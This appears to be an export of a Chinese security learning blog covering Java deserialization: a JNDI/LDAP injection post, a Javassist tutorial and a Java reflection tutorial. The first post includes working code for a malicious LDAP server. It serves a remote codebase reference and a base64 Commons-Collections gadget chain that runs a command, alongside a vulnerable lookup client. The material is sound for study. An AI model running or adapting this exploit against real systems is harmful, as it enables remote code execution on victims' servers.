class="line"></span><br><span class="line"><span class="keyword">import</span> javax.net.ServerSocketFactory;</span><br><span class="line"><span class="keyword">import</span> javax.net.SocketFactory;</span><br><span class="line"><span class="keyword">import</span> javax.net.ssl.SSLSocketFactory;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.net.InetAddress;</span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.text.ParseException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LDAPInj</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">LDAP_BASE</span> <span class="operator">=</span> <span class="string">&quot;dc=example,dc=com&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">port</span> <span class="operator">=</span> <span class="number">7777</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">InMemoryDirectoryServerConfig</span> <span class="variable">config</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InMemoryDirectoryServerConfig</span>(LDAP_BASE);</span><br><span class="line">            config.setListenerConfigs(<span class="keyword">new</span> <span class="title class_">InMemoryListenerConfig</span>(</span><br><span class="line">                    <span class="string">&quot;listen&quot;</span>, InetAddress.getByName(<span class="string">&quot;0.0.0.0&quot;</span>), port,</span><br><span class="line">                    ServerSocketFactory.getDefault(), SocketFactory.getDefault(),</span><br><span class="line">                    (SSLSocketFactory) SSLSocketFactory.getDefault()</span><br><span class="line">            ));</span><br><span class="line"></span><br><span class="line">            config.addInMemoryOperationInterceptor(<span class="keyword">new</span> <span class="title class_">OperationInterceptor</span>(<span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://localhost:8080/#EvilLDAP&quot;</span>)));</span><br><span class="line">            <span class="type">InMemoryDirectoryServer</span> <span class="variable">ds</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InMemoryDirectoryServer</span>(config);</span><br><span class="line">            System.out.println(<span class="string">&quot;Listening on 0.0.0.0:&quot;</span> + port);</span><br><span class="line">            ds.startListening();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">OperationInterceptor</span> <span class="keyword">extends</span> <span class="title class_">InMemoryOperationInterceptor</span> &#123;</span><br><span class="line">        <span class="keyword">private</span> URL codebase;</span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">OperationInterceptor</span> <span class="params">( URL cb )</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.codebase = cb;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">processSearchResult</span> <span class="params">( InMemoryInterceptedSearchResult result )</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">base</span> <span class="operator">=</span> result.getRequest().getBaseDN();</span><br><span class="line">            <span class="type">Entry</span> <span class="variable">e</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Entry</span>(base);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                sendResult(result, base, e);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span> ( Exception e1 ) &#123;</span><br><span class="line">                e1.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">sendResult</span> <span class="params">( InMemoryInterceptedSearchResult result, String base, Entry e )</span> <span class="keyword">throws</span> LDAPException, MalformedURLException, ParseException &#123;</span><br><span class="line">            <span class="type">URL</span> <span class="variable">turl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="built_in">this</span>.codebase, <span class="built_in">this</span>.codebase.getRef().replace(<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;/&#x27;</span>).concat(<span class="string">&quot;.class&quot;</span>));</span><br><span class="line">            System.out.println(<span class="string">&quot;Send LDAP reference result for &quot;</span> + base + <span class="string">&quot; redirecting to &quot;</span> + turl);</span><br><span class="line">            e.addAttribute(<span class="string">&quot;javaClassName&quot;</span>, <span class="string">&quot;foo&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">cbstring</span> <span class="operator">=</span> <span class="built_in">this</span>.codebase.toString();</span><br><span class="line">            <span class="type">int</span> <span class="variable">refPos</span> <span class="operator">=</span> cbstring.indexOf(<span class="string">&#x27;#&#x27;</span>);</span><br><span class="line">            <span class="keyword">if</span> ( refPos &gt; <span class="number">0</span> ) &#123;</span><br><span class="line">                cbstring = cbstring.substring(<span class="number">0</span>, refPos);</span><br><span class="line">            &#125;</span><br><span class="line">            e.addAttribute(<span class="string">&quot;javaCodeBase&quot;</span>, cbstring);</span><br><span class="line">            e.addAttribute(<span class="string">&quot;objectClass&quot;</span>, <span class="string">&quot;javaNamingReference&quot;</span>);</span><br><span class="line">            e.addAttribute(<span class="string">&quot;javaSerializedData&quot;</span>, Base64.decode(<span class="string">&quot;rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldLpEhZWWuLc0AwAAeHB3DAAAAAI/QAAAAAAAAXNyADRvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMua2V5dmFsdWUuVGllZE1hcEVudHJ5iq3SmznBH9sCAAJMAANrZXl0ABJMamF2YS9sYW5nL09iamVjdDtMAANtYXB0AA9MamF2YS91dGlsL01hcDt4cHQAA2Zvb3NyACpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMubWFwLkxhenlNYXBu5ZSCnnkQlAMAAUwAB2ZhY3Rvcnl0ACxMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwc3IAOm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5DaGFpbmVkVHJhbnNmb3JtZXIwx5fsKHqXBAIAAVsADWlUcmFuc2Zvcm1lcnN0AC1bTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHVyAC1bTG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5UcmFuc2Zvcm1lcju9Virx2DQYmQIAAHhwAAAABXNyADtvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ29uc3RhbnRUcmFuc2Zvcm1lclh2kBFBArGUAgABTAAJaUNvbnN0YW50cQB+AAN4cHZyABFqYXZhLmxhbmcuUnVudGltZQAAAAAAAAAAAAAAeHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkludm9rZXJUcmFuc2Zvcm1lcofo/2t7fM44AgADWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PYmplY3Q7TAALaU1ldGhvZE5hbWV0ABJMamF2YS9sYW5nL1N0cmluZztbAAtpUGFyYW1UeXBlc3QAEltMamF2YS9sYW5nL0NsYXNzO3hwdXIAE1tMamF2YS5sYW5nLk9iamVjdDuQzlifEHMpbAIAAHhwAAAAAnQACmdldFJ1bnRpbWV1cgASW0xqYXZhLmxhbmcuQ2xhc3M7qxbXrsvNWpkCAAB4cAAAAAB0AAlnZXRNZXRob2R1cQB+ABsAAAACdnIAEGphdmEubGFuZy5TdHJpbmeg8KQ4ejuzQgIAAHhwdnEAfgAbc3EAfgATdXEAfgAYAAAAAnB1cQB+ABgAAAAAdAAGaW52b2tldXEAfgAbAAAAAnZyABBqYXZhLmxhbmcuT2JqZWN0AAAAAAAAAAAAAAB4cHZxAH4AGHNxAH4AE3VyABNbTGphdmEubGFuZy5TdHJpbmc7rdJW5+kde0cCAAB4cAAAAAF0AARjYWxjdAAEZXhlY3VxAH4AGwAAAAFxAH4AIHNxAH4AD3NyABFqYXZhLmxhbmcuSW50ZWdlchLioKT3gYc4AgABSQAFdmFsdWV4cgAQamF2YS5sYW5nLk51bWJlcoaslR0LlOCLAgAAeHAAAAABc3IAEWphdmEudXRpbC5IYXNoTWFwBQfawcMWYNEDAAJGAApsb2FkRmFjdG9ySQAJdGhyZXNob2xkeHA/QAAAAAAAAHcIAAAAEAAAAAB4eHg=&quot;</span>));</span><br><span class="line"></span><br><span class="line">            result.sendSearchEntry(e);</span><br><span class="line">            result.setResult(<span class="keyword">new</span> <span class="title class_">LDAPResult</span>(<span class="number">0</span>, ResultCode.SUCCESS));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>受攻击Client:</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> jndi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.el.ELProcessor;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TEST</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">         <span class="comment">//   System.setProperty(&quot;com.sun.jndi.rmi.object.trustURLCodebase&quot;,&quot;true&quot;);</span></span><br><span class="line"><span class="comment">//            //写法一 将codebase的地址写在lookup中</span></span><br><span class="line">            <span class="comment">//context.lookup(&quot;ldap://127.0.0.1:7777/#EvilLDAP&quot;);</span></span><br><span class="line">            <span class="comment">//写法二 预先设定环境，以hashtable的形式保存在context中</span></span><br><span class="line">            <span class="comment">//System.setProperty(&quot;com.sun.jndi.ldap.object.trustURLCodebase&quot;,&quot;true&quot;);</span></span><br><span class="line">            Hashtable&lt;String,String&gt; env= <span class="keyword">new</span> <span class="title class_">Hashtable</span>&lt;String, String&gt;();</span><br><span class="line">            env.put(Context.INITIAL_CONTEXT_FACTORY,<span class="string">&quot;com.sun.jndi.ldap.LdapCtxFactory&quot;</span>);</span><br><span class="line">            env.put(Context.PROVIDER_URL, <span class="string">&quot;ldap://localhost:7777&quot;</span>);</span><br><span class="line">            <span class="type">Context</span> <span class="variable">context</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>(env);</span><br><span class="line">            context.lookup(<span class="string">&quot;Exploit&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NamingException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="一些题外话"><a href="#一些题外话" class="headerlink" title="一些题外话"></a>一些题外话</h1><p>一些题外话：在学习JNDI与LDAP结合注入的过程中，我翻阅了大量资料，发现网上基本都是各种复刻版，实在不适合新手学习，后来去看了<strong>Alvaro Muñoz 和Oleksandr Miroshhe</strong>在<strong>Black Hat</strong>的演讲，感觉豁然开朗。在此文中，我难以将我遇到的坑全部讲清楚，建议动手操作，最好是先去看看<strong>Black Hat</strong>的视频，其中将JNDI注入、LDAP和一些相关应用场景讲的非常清楚。</p>
<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="https://www.youtube.com/watch?v=Y8a5nB-vy78">A Journey From JNDI/LDAP Manipulation to Remote Code Execution Dream Land</a></p>
<p><a href="https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE-wp.pdf">HPE Security Fortify, Software Security Research</a></p>
<p><a href="https://blog.z3ratu1.cn/Java%20RMI%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8EJNDI%E6%B3%A8%E5%85%A5%E5%85%A5%E9%97%A8.html">Java RMI反序列化与JNDI注入入门</a></p>
]]></content>
      <categories>
        <category>Web Security</category>
        <category>Java Deserialization</category>
      </categories>
      <tags>
        <tag>Web Security</tag>
        <tag>Java Deserialization</tag>
      </tags>
  </entry>
  <entry>
    <title>Java反序列化漏洞之Javassist(8)</title>
    <url>/2021/11/24/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BJavassist-8/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p><strong>Javassist</strong>是一个可以<strong>动态</strong>生成Java字节码(.class)的库，它可以在<strong>运行</strong>的时候生成新的类。有时候，我们需要在所有class都被编译完后，运行时再修改或新建一个class文件，Javassist可以帮助我们达到这个目的。</p>
<h1 id="Javassist基本元素"><a href="#Javassist基本元素" class="headerlink" title="Javassist基本元素"></a>Javassist基本元素</h1><p><strong>CtClass</strong> - Compile Time Class - 即编译时的Class，每个<strong>需要修改编辑</strong>的class都对应一个CtClass instance</p>
<p><strong>ClassPool</strong> - 一个存储<strong>CtClass对象</strong>的容器</p>
<p><strong>CtField</strong> - Java中的field</p>
<p><strong>CtMethod</strong> - Java中的method</p>
<span id="more"></span>

<h1 id="简单演示"><a href="#简单演示" class="headerlink" title="简单演示"></a>简单演示</h1><h2 id="导入依赖"><a href="#导入依赖" class="headerlink" title="导入依赖"></a>导入依赖</h2><h3 id="方法一：pom-xml"><a href="#方法一：pom-xml" class="headerlink" title="方法一：pom.xml"></a>方法一：pom.xml</h3><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javassist<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>javassist<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.12.1.GA<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>方法二：导入jar包</strong></p>
<p>可在网上下载jar包，导入module，library</p>
<h2 id="创建Class"><a href="#创建Class" class="headerlink" title="创建Class"></a>创建Class</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">javassistTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NotFoundException, CannotCompileException, IOException &#123;</span><br><span class="line">        </span><br><span class="line">		<span class="comment">/*创建Class*/</span></span><br><span class="line">        <span class="comment">//需要创建的class对应一个CtClass, ClassPool是一个容器，包含了各种CtClass</span></span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">cp</span> <span class="operator">=</span> ClassPool.getDefault();<span class="comment">//获取一个默认的ClassPool</span></span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">test</span> <span class="operator">=</span> cp.makeClass(<span class="string">&quot;Evil&quot;</span>);<span class="comment">//用这个ClassPool来创建一个CtClass，名字为Evil</span></span><br><span class="line"></span><br><span class="line">		<span class="comment">/*添加Field*/</span></span><br><span class="line">        <span class="type">CtField</span> <span class="variable">name</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CtField</span>(cp.get(<span class="string">&quot;java.lang.String&quot;</span>),<span class="string">&quot;name&quot;</span>,test);<span class="comment">//create a String-type field called name for the class test</span></span><br><span class="line">        name.setModifiers(Modifier.PRIVATE);<span class="comment">//private attribute</span></span><br><span class="line">        test.addField(name,CtField.Initializer.constant(<span class="string">&quot;Mark&quot;</span>));<span class="comment">//给test class里的name字段初始化为Mark</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">/*添加constructor*/</span></span><br><span class="line">        <span class="type">CtConstructor</span> <span class="variable">ctConstructor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CtConstructor</span>(<span class="keyword">new</span> <span class="title class_">CtClass</span>[]&#123;&#125;,test);<span class="comment">//给Test Class创建一个无参constructor</span></span><br><span class="line">        ctConstructor.setBody(<span class="string">&quot;&#123;name=\&quot;Jack\&quot;;&#125;&quot;</span>);</span><br><span class="line">        test.addConstructor(ctConstructor);</span><br><span class="line">        <span class="comment">//有参构造函数</span></span><br><span class="line">        <span class="type">CtConstructor</span> <span class="variable">ctConstructor1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CtConstructor</span>(<span class="keyword">new</span> <span class="title class_">CtClass</span>[]&#123;cp.get(<span class="string">&quot;java.lang.String&quot;</span>)&#125;,test);</span><br><span class="line">        ctConstructor1.setBody(<span class="string">&quot;&#123;$0.name=$1;&#125;&quot;</span>);<span class="comment">//this.name = name(第一个parameter)</span></span><br><span class="line">        test.addConstructor(ctConstructor1);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*添加method*/</span></span><br><span class="line">        <span class="type">CtMethod</span> <span class="variable">printName</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CtMethod</span>(CtClass.voidType,<span class="string">&quot;printName&quot;</span>,<span class="keyword">new</span> <span class="title class_">CtClass</span>[]&#123;&#125;,test);</span><br><span class="line">        printName.setModifiers(Modifier.PUBLIC);</span><br><span class="line">        printName.setBody(<span class="string">&quot;&#123;System.out.println($0.name);&#125;&quot;</span>);</span><br><span class="line">        printName.insertBefore(<span class="string">&quot;System.out.println(\&quot;before:\&quot;);&quot;</span>);<span class="comment">//在方法体前面加入（注意必须有了方法体才能插入）</span></span><br><span class="line">        printName.insertAfter(<span class="string">&quot;System.out.println(\&quot;after:\&quot;);&quot;</span>);<span class="comment">//在方法体后面加入</span></span><br><span class="line">        test.addMethod(printName);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*写出Class到本地*/</span></span><br><span class="line">        test.writeFile();</span><br><span class="line">        test.detach();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><p><img src="/image/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BJavassist-8/image-20211124203629163.png" alt="image-20211124203629163"></p>
<h1 id="一些特殊参数"><a href="#一些特殊参数" class="headerlink" title="一些特殊参数"></a>一些特殊参数</h1><table>
<thead>
<tr>
<th>标识符</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td>0、1、$2、 3 、 3、 3、…</td>
<td>this和方法参数（1-N是方法参数的顺序，如第一个parameter）</td>
</tr>
<tr>
<td>$args</td>
<td>方法参数数组，类型为Object[]</td>
</tr>
<tr>
<td>$$</td>
<td>所有方法参数，例如：m($$)相当于m(1,1,2,…)</td>
</tr>
<tr>
<td>$cflow(…)</td>
<td>control flow 变量</td>
</tr>
<tr>
<td>$r</td>
<td>返回结果的类型，在强制转换表达式中使用。</td>
</tr>
<tr>
<td>$w</td>
<td>包装器类型，在强制转换表达式中使用。</td>
</tr>
<tr>
<td>$_</td>
<td>返回的结果值</td>
</tr>
<tr>
<td>$sig</td>
<td>类型为java.lang.Class的参数类型对象数组</td>
</tr>
<tr>
<td>$type</td>
<td>类型为java.lang.Class的返回值类型</td>
</tr>
<tr>
<td>$class</td>
<td>类型为java.lang.Class的正在修改的类</td>
</tr>
</tbody></table>
<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="https://juejin.cn/post/6952765170544279566#heading-13">Java字节码编程之非常好用的javassist</a></p>
]]></content>
      <categories>
        <category>Web Security</category>
        <category>Java Deserialization</category>
      </categories>
      <tags>
        <tag>Web Security</tag>
        <tag>Java Deserialization</tag>
      </tags>
  </entry>
  <entry>
    <title>Java反序列化漏洞之Java反射机制(1)</title>
    <url>/2021/07/21/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BJava%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6-1/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这是正式开始学习Java反序列化漏洞的第一篇，而Java反射机制是熟知Java反序列化漏洞的第一步，此系列笔记是为了自己能更好理解反序列化漏洞，也希望通过学习，自己能深层了解漏洞成因、学会利用、自己编写、改编利用工具。</p>
<h1 id="Java-Reflection"><a href="#Java-Reflection" class="headerlink" title="Java Reflection"></a>Java Reflection</h1><h2 id="什么是Java反射机制"><a href="#什么是Java反射机制" class="headerlink" title="什么是Java反射机制"></a>什么是Java反射机制</h2><blockquote>
<p>Java的反射（reflection）机制是指在程序的运行状态中，可以构造任意一个类的对象，可以了解任意一个对象所属的类，可以了解任意一个类的成员变量和方法，可以调用任意一个对象的属性和方法。这种动态获取程序信息以及动态调用对象的功能称为Java语言的反射机制。反射被视为动态语言的关键。</p>
</blockquote>
<p>通俗的来说，就是我们可以通过Java的反射机制来获取到任意一个Class、变量、method、instance等等，而我们<strong>动态</strong>地任意获取Class，正有利于我们实现反序列化漏洞的利用。</p>
<h2 id="静态语言和动态特性"><a href="#静态语言和动态特性" class="headerlink" title="静态语言和动态特性"></a>静态语言和动态特性</h2><p>简单来说，动态语言可以改变一个变量的类型 - 你不用提前定义某个变量的类型，比如<code>Python</code>和<code>PHP</code>,这些语言会在运行时自动探针你的变量类型，而你也可以在代码中随时对这些变量类型进行改变。</p>
<p>而静态语言例如<code>Java</code>,<code>C/C++</code>,<code>C#</code>就不一样，我们必须事先指定变量类型是<code>String</code>,<code>int</code>,还是<code>double</code>？</p>
<p>而在<code>Java</code>中，有一个<strong>反射机制</strong>，它可以为我们提供一些动态特性 - 即使<code>Java</code>是一门静态语言。</p>
<p>Java的反射机制可以让我们做到如下：</p>
<ul>
<li>在程序运行时，查找到一个<code>Object</code>所属的<code>Class</code></li>
<li>在程序运行时，能找到任意一个Class的<code>variable</code>和<code>method</code></li>
<li>在程序运行时，可以构造任意一个<code>Class</code>的<code>instance(Object)</code></li>
<li>在程序运行时，可以调用任何一个<code>Object</code>的方法</li>
</ul>
<span id="more"></span>

<h2 id="Class类"><a href="#Class类" class="headerlink" title="Class类"></a>Class类</h2><p>先来看一张图：</p>
<p><img src="/image/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BJava%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6-1/image-20211126201028486.png" alt="image-20211126201028486"></p>
<p><strong>Class类</strong>： 保存类信息的类</p>
<p>每一个新的class在创建的时候，都会new一个新的Class类。</p>
<p>比如，我们在创建一个String类，这个String类在创建的同时，会有一个Class cls=new Class(String)被创建，专门用来保存这个String Class。</p>
<p>再举个例子，比如我们在创建一个Person类，这个Person类在创建的时候，会有一个Class cls = new Class(Person)这样的instance被创建。<strong>但Class类和这两个类并非继承关系！！</strong></p>
<p>所以，我们需要区分的是Class类是一个类，就像Person和String类一样，都是<strong>类</strong>，Person和String类在生成的时候，都会先生成Class类的instance（对象）。</p>
<p>在Class类中，我们含有各种方法函数，其中Class类的构造方法是private，Class类还拥有<code>getMethod,invoke</code>这样的方法。</p>
<p><strong>从图中可以看出：我们可以通过一个【person instance】.getClass()获取到person的Class类对象</strong></p>
<p><strong>通过【person的Class类对象】.class获取到person instance.</strong></p>
<h2 id="利用反射机制获取Class及Class静态初始化"><a href="#利用反射机制获取Class及Class静态初始化" class="headerlink" title="利用反射机制获取Class及Class静态初始化"></a>利用反射机制获取Class及Class静态初始化</h2><p>我们知道有三种方法可以获取到一个Class对象</p>
<ul>
<li><p><code>obj.getClass();</code></p>
<ul>
<li>当我们知道<strong>obj instance对象</strong>时可以使用这个方法</li>
</ul>
</li>
<li><p><code>Class.forName(&quot;Class的名字&quot;);</code></p>
</li>
<li><p><code>Class.forName( String className , Boolean initialize , ClassLoader loader );</code></p>
<ul>
<li><p>此处<code>Class.forName(&quot;Class的名字&quot;);</code>等同于<code>Class.forName( &quot;Class的名字&quot; , true , currentLoader );</code></p>
<blockquote>
<ul>
<li><code>String className</code> : 类名</li>
<li><code>Boolean initialize</code> : 是否进行类初始化</li>
<li><code>ClassLoader loader</code> : 加载器( 告诉 Java 虚拟机如何加载获取的类 , Java 默认根据类名( 即类的绝对路径 , 例如 <code>java.lang.Runtime()</code> )来加载类 )</li>
</ul>
</blockquote>
</li>
<li><p><code>Class</code>在<strong>初始化</strong>的时候，会自动执行<code>static&#123;&#125;</code>中的代码，如果我们能够控制一个<code>Class</code>，并向其中添加含有恶意代码的<strong>静态代码块</strong>，当<code>Class</code>被初始化的时候就会执行恶意代码。</p>
</li>
<li><p>当我们知道<strong>Class名字</strong>时可以使用这个方法</p>
</li>
</ul>
</li>
<li><p><code>className.class</code></p>
<ul>
<li>当我们已经<strong>加载过</strong>某个Class，可以用这个方法</li>
</ul>
</li>
</ul>
<p>其中，<code>Class.forName(&quot;Class的名字&quot;);</code>是最为常用的一种方式。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class&lt;?&gt; person = Class.forName(<span class="string">&quot;Person&quot;</span>);</span><br><span class="line"></span><br><span class="line">System.out.println(person);</span><br></pre></td></tr></table></figure>

<h2 id="利用反射机制获取method"><a href="#利用反射机制获取method" class="headerlink" title="利用反射机制获取method"></a>利用反射机制获取method</h2><p>我们在通过上面的代码获取到<code>class</code>后，可以获取到该<code>Class</code>的<code>method</code>。</p>
<p>需要注意的是，我们依然有两种不同的方法来获取到<code>method</code>。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//第一种方式：</span></span><br><span class="line">person.getDeclaredMethods();<span class="comment">//获取所有Method，除了继承类的方法</span></span><br><span class="line">person.getDeclaredMethod(<span class="string">&quot;methodName&quot;</span>,parameterTypes);<span class="comment">//获取指定的method</span></span><br><span class="line"><span class="comment">//第二种方式：</span></span><br><span class="line">person.getMethods();<span class="comment">//获取类方法，但不包含private属性的方法</span></span><br><span class="line">person.getMethod(<span class="string">&quot;methodName&quot;</span>,parameterTypes);<span class="comment">//获取指定名字的方法</span></span><br></pre></td></tr></table></figure>

<h2 id="构造instance"><a href="#构造instance" class="headerlink" title="构造instance"></a>构造instance</h2><p> 获取到了<code>Class</code>,我们又该如何获取到一个新的object呢？</p>
<p>假设在Person Class中，我们有三个构造函数：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">Person</span><span class="params">()</span>&#123;<span class="comment">//无参构造</span></span><br><span class="line">    System.out.println(<span class="string">&quot;NoArgConstructor&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(String name,String age)</span>&#123;<span class="comment">//两个参数构造</span></span><br><span class="line">    System.out.println(<span class="string">&quot;TwoArgsConstructor&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(String name,String age,<span class="type">boolean</span> flag)</span>&#123;</span><br><span class="line">    <span class="comment">//三个参数构造</span></span><br><span class="line">    System.out.println(<span class="string">&quot;ThreeArgsConstructor&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当我们依次获取时</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">person.newInstance();<span class="comment">//在创建新的instance时，class的constructor会被执行，而此处默认执行无参数constructor</span></span><br><span class="line">       person.getConstructor(String.class,String.class).newInstance(<span class="string">&quot;leihehe&quot;</span>,<span class="string">&quot;21&quot;</span>);<span class="comment">//此处执行两个参数的constructor</span></span><br><span class="line">       person.getConstructor(String.class,String.class,<span class="type">boolean</span>.class).newInstance(<span class="string">&quot;leiheee&quot;</span>,<span class="string">&quot;20&quot;</span>,<span class="literal">true</span>);<span class="comment">//此处执行三个参数的constructor</span></span><br></pre></td></tr></table></figure>

<p>可得如下结果</p>
<p><img src="/image/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BJava%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/image-20210721212917832.png" alt="image-20210721212917832"></p>
<h2 id="invoke方法"><a href="#invoke方法" class="headerlink" title="invoke方法"></a>invoke方法</h2><p>当我们构造出来了一个新的<code>instance（Object）</code>且得到需要的<code>method</code>后，我们该如何<code>call</code>这个<code>Class</code>的方法呢？</p>
